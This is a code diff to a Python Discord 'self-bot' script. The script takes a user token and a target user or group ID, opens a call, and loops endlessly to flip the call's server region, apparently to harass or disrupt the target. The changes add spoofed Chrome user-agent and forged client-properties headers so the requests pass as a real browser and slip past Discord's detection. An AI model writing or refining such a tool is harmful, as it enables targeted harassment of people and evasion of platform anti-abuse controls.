@@ -7,7 +7,6 @@
 ########################################################
 import os
 from datetime import datetime
-import time
 import asyncio
 import itertools
 import getpass
@@ -49,7 +48,7 @@ reg = itertools.cycle(regions)
 async def execute(token, port):
 	async with aiohttp.ClientSession() as session:
 		while True:
-			r = await session.patch(url=f"https://discord.com/api/v9/channels/{port}/call", json={"region":next(reg)}, headers={'authorization': token})
+			r = await session.patch(url=f"https://discord.com/api/v9/channels/{port}/call", json={"region":next(reg)}, headers={"user-agent": "Mozilla/5.0 (X11; CrOS aarch64 14324.80.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.102 Safari/537.36", 'authorization': token})
 			if r.status == 204:
 				await aioconsole.aprint(f"{coloring.GREEN}<==========[Request Successful: {r.status}==========>")
 			else: 
@@ -74,7 +73,7 @@ def main(token):
 	id = input("Enter Target ID: ")
 	print("\n")
 	if choice.lower() == "dm":
-		res = httpx.post("https://discord.com/api/v9/users/@me/channels", json={ "recipients": [id]}, headers={'authorization': token}).json()
+		res = httpx.post("https://discord.com/api/v9/users/@me/channels", json={ "recipients": [id]}, headers={"user-agent": "Mozilla/5.0 (X11; CrOS aarch64 14324.80.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.102 Safari/537.36", 'authorization': token}).json()
 		dmid = res['id']
 		asyncio.run(execute(token, dmid))
 	elif choice.lower() == "gc":
@@ -84,11 +83,10 @@ if __name__ == "__main__":
 	token = getpass.getpass(prompt=f"""\n{coloring.BLUE}┌──{coloring.BLUE}「{coloring.RED}Enter[Ω]Token{coloring.BLUE}」-[{coloring.YELLOW}!{coloring.BLUE}]{coloring.WHITE}:{coloring.BLUE}
 └─{coloring.MAGENTA}${coloring.WHITE}: """, stream=None)
 	os.system("cls" if os.name == "nt" else "clear")
-	r = httpx.get("https://discord.com/api/v9/users/@me/library", headers={"authorization": token})
+	r = httpx.get("https://discord.com/api/v9/users/@me/library", headers={"x-super-properties": "eyJvcyI6IiIsImJyb3dzZXIiOiJDaHJvbWUiLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoWDExOyBDck9TIGFhcmNoNjQgMTQzMjQuODAuMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk3LjAuNDY5Mi4xMDIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijk3LjAuNDY5Mi4xMDIiLCJvc192ZXJzaW9uIjoiIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50Ijoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lX2N1cnJlbnQiOiJnb29nbGUiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMTM1ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9", "user-agent": "Mozilla/5.0 (X11; CrOS aarch64 14324.80.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.102 Safari/537.36", "authorization": token})
 	if r.status_code == 200 or r.status_code == 204:
 		pass
 	else:
 		print(f"{coloring.RED}Invalid user token provided. Join https://discord.gg/8NFesgFaYb for support.")
-		time.sleep(3)
 		quit()
 	main(token)
